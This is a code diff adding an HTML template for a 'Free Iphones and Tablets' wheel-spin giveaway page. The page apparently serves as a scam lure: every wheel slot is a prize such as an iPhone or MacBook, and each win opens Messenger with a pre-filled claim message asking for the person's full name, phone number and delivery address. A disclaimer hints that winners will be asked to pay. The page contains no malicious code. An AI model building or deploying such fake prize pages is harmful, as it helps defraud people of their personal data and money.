@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#0f0"> <!-- Matches your green theme -->
+    <link rel="manifest" href="/manifest.json"> <!-- Add this file for full PWA support -->
+    <title>Free Iphones and Tablets - Wheel Spin Game</title>
+    <!-- Confetti library for fun win effect -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            background: #111; 
+            color: white; 
+            margin: 0; 
+            padding: 20px; 
+            min-height: 100vh; 
+        }
+        h1 { color: #0f0; margin-bottom: 10px; }
+        h2 { color: #0f0; }
+        #wheel { 
+            width: 90vw; 
+            max-width: 400px; 
+            height: 90vw; 
+            max-height: 400px; 
+            margin: 20px auto; 
+            border-radius: 50%; 
+            border: 8px solid #333; 
+            background: conic-gradient(
+                #ff0000 0deg 32.727deg, #00ff00 32.727deg 65.455deg, #0000ff 65.455deg 98.182deg,
+                #ffff00 98.182deg 130.909deg, #ff00ff 130.909deg 163.636deg, #00ffff 163.636deg 196.364deg,
+                #ffa500 196.364deg 229.091deg, #800080 229.091deg 261.818deg, #008000 261.818deg 294.545deg,
+                #ff69b4 294.545deg 327.273deg, #4b0082 327.273deg 360deg
+            ); 
+            position: relative; 
+            overflow: hidden; 
+            transition: transform 5s cubic-bezier(0.25, 0.1, 0.25, 1); 
+            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+        }
+        #pointer { 
+            position: absolute; 
+            top: -30px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            width: 0; 
+            height: 0; 
+            border-left: 20px solid transparent; 
+            border-right: 20px solid transparent; 
+            border-bottom: 40px solid #fff; 
+            z-index: 10; 
+        }
+        #result { font-size: 2em; margin: 20px; color: #ff0; font-weight: bold; min-height: 80px; }
+        button { 
+            padding: 15px 40px; 
+            font-size: 1.5em; 
+            background: #0f0; 
+            color: black; 
+            border: none; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            margin: 10px; 
+            transition: background 0.3s;
+        }
+        button:hover:not(:disabled) { background: #0c0; }
+        button:disabled { background: #555; cursor: not-allowed; }
+        #info { font-size: 1.2em; margin-bottom: 15px; }
+        #claimSection { 
+            display: none; 
+            margin: 30px auto; 
+            max-width: 500px; 
+            padding: 20px; 
+            background: rgba(0,0,0,0.5); 
+            border-radius: 15px; 
+            border: 2px solid #0084ff;
+        }
+        #claimBtn { 
+            background: #0084ff; 
+            color: white; 
+            font-size: 1.4em; 
+            padding: 18px 50px; 
+        }
+        #claimBtn:hover { background: #0066cc; }
+        .disclaimer {
+            font-size: 0.8em; 
+            color: #aaa; 
+            margin-top: 40px; 
+            line-height: 1.4;
+        }
+        @media (max-width: 500px) {
+            #wheel { width: 300px; height: 300px; }
+            button { font-size: 1.3em; padding: 12px 30px; }
+        }
+    </style>
+</head>
+<body>
+    <h1>Free Iphones and Tablets 🎡 Wheel Spin Game</h1>
+    <p id="info">Spins left: <strong id="remaining">{{ remaining }}</strong> / {{ max_spins }}</p>
+    
+    <div id="wheel">
+        <div id="pointer"></div>
+    </div>
+    
+    <button id="spinBtn">SPIN NOW!</button>
+    <div id="result"></div>
+
+    <!-- Claim section - appears only after win -->
+    <div id="claimSection">
+        <h2>🎉 You Won! Claim Your Prize</h2>
+        <p>Click below to open Messenger with a pre-filled message (including your prize). Add your full name, phone number, delivery address, and any other details, then send it to us at Free Iphones and Tablets!</p>
+        <a id="claimLink" href="#" target="_blank" rel="noopener noreferrer">
+            <button id="claimBtn">Open Messenger & Claim Now</button>
+        </a>
+        <p style="font-size:0.9em; margin-top:15px; color:#ccc;">
+            We'll verify your win and arrange delivery as soon as possible. Only share personal info in this private chat!
+        </p>
+    </div>
+
+    <!-- US Legal Disclaimer -->
+    <p class="disclaimer">
+        This promotion is not sponsored, endorsed, or administered by Meta/Facebook. Open to US residents 18+. Only pay if the prize is guaranteed by the page admin. Void where prohibited. Winners contact via Messenger for verification. Full rules: [link to your rules if you have one].
+    </p>
+
+    <script>
+        const prizes = [
+            "iPhone 15 Pro Max", "iPhone 15 Pro Max",
+            "iPhone 17 Pro Max", "iPhone 17 Pro Max",
+            "iPhone 16",
+            "Samsung Tablet",
+            "iPad", "iPad",
+            "MacBook Pro",
+            "HP Laptop",
+            "Dell Laptop"
+        ];
+        
+        const wheel = document.getElementById('wheel');
+        const btn = document.getElementById('spinBtn');
+        const result = document.getElementById('result');
+        const remainingEl = document.getElementById('remaining');
+        const claimSection = document.getElementById('claimSection');
+        const claimLink = document.getElementById('claimLink');
+        
+        let remaining = {{ remaining }};
+        let currentPrize = '';
+        
+        function updateButton() {
+            btn.disabled = remaining <= 0;
+            btn.textContent = remaining > 0 ? "SPIN NOW!" : "No Spins Left 😔";
+        }
+        updateButton();
+
+        btn.addEventListener('click', async () => {
+            if (remaining <= 0) return;
+            
+            btn.disabled = true;
+            result.textContent = "Spinning the wheel... 🎰";
+            claimSection.style.display = 'none';
+            
+            try {
+                const res = await fetch('/spin', { method: 'POST' });
+                const data = await res.json();
+                
+                if (data.error) {
+                    result.textContent = data.error;
+                } else {
+                    const randomExtra = Math.floor(Math.random() * 5) + 5;
+                    const prizeIndex = prizes.indexOf(data.prize);
+                    const degPerPrize = 360 / prizes.length;
+                    const stopAngle = 360 - (prizeIndex * degPerPrize + degPerPrize / 2) + (randomExtra * 360);
+                    
+                    wheel.style.transform = `rotate(${stopAngle}deg)`;
+                    
+                    setTimeout(() => {
+                        currentPrize = data.prize;
+                        result.innerHTML = `You WON:<br><strong style="color:#0f0; font-size:1.8em;">${data.prize}!</strong> 🎉🔥`;
+                        confetti({
+                            particleCount: 120,
+                            spread: 80,
+                            origin: { y: 0.6 },
+                            resize: true  // Helps on rotation/orientation change
+                        });
+                        remaining = data.remaining;
+                        remainingEl.textContent = remaining;
+                        updateButton();
+                        
+                        // Dynamic pre-filled Messenger message
+                        const prefillText = encodeURIComponent(
+                            `I just won ${currentPrize} on your Free Iphones and Tablets wheel spin game! Please help me claim it. My details: `
+                        );
+                        claimLink.href = `https://m.me/FreeIphonesandTablets?text=${prefillText}`;
+                        claimSection.style.display = 'block';
+                    }, 5000);
+                }
+            } catch (err) {
+                result.textContent = "Oops! Error spinning — try again.";
+            } finally {
+                setTimeout(() => { 
+                    btn.disabled = false; 
+                }, 6000);
+            }
+        });
+    </script>
+</body>
+</html>
